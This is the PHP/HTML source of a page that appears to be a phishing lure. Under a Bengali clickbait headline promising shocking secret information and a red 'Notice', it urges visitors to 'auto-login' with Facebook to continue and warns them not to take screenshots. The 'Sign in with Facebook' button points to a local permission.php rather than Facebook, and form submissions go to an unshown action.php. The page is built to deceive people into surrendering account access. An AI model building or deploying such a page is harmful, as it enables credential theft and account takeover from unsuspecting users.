<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">



    <title>বেরিয়ে এলো চাঞ্চলক তথ্য</title>
  </head>
  <body>

  <br><br>
    <h1>
        <div class="text-center" style="padding-top: 10px;font-size:30px;color:red;">Notice</div>
    </h1>

    <br>
  <div class="container">
  <div class="row">
    <div class="col-sm">
    </div>
    <div class="col-sm">
      
    <figure class="figure">
  <img src="./news.png" class="figure-img img-fluid rounded" alt="A generic square placeholder image with rounded corners in a figure.">
  <figcaption class="figure-caption text-right">
  
<br>

<?php

if($_SERVER['REQUEST_METHOD'] == "POST"){
    include 'action.php';

 
}else{
?>
<!-- else -->



<center>
<h4>তথ্যটি অত্যন্ত গোপনীয় তাই ফেসবুকের মাধ্যমে অটো লগিন করে চালিয়ে যান।<br>দয়া করে কোন প্রকার স্ক্রিন শট নিতে যাবেন না।</h4>
<br>
<!-- Fb Login -->
<div class="container">
    <a style="color:white;" class="btn btn-lg btn-social btn-facebook" href="permission.php">
        <i class="fa fa-facebook fa-fw"></i> Sign in with Facebook
    </a>
</div>
</center>
<style>
.btn-facebook {
    color: #fff;
    background-color: #3b5998;
    border-color: rgba(0,0,0,0.2);
}

.btn-social {
    position: relative;
    padding-left: 44px;
    text-align: left;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.btn-social:hover {
    color: #fff !important;
}

.btn-social :first-child {
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 40px;
    padding: 7px;
    font-size: 1.6em;
    text-align: center;
    border-right: 1px solid rgba(0,0,0,0.2);
}
</style>







<?php
}
?>
<!-- else -->

    </div>
    <div class="col-sm">


    </div>
  </div>
</div>



    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>
</html>